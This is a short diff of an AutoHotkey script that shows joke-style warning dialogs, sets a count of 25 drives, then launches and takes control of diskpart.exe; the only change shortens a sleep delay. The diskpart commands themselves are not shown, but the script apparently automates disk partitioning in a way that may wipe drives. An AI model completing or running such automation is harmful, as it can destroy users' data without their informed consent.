@@ -11,7 +11,7 @@ MsgBox, Stop
 MsgBox, I guess if you really want to
 drives := 25
 Run, diskpart.exe
-Sleep, 6000
+Sleep, 3000
 WinActivate, C:\WINDOWS\SYSTEM32\diskpart.exe
 WinWaitActive, C:\WINDOWS\SYSTEM32\diskpart.exe
 sleep, 100
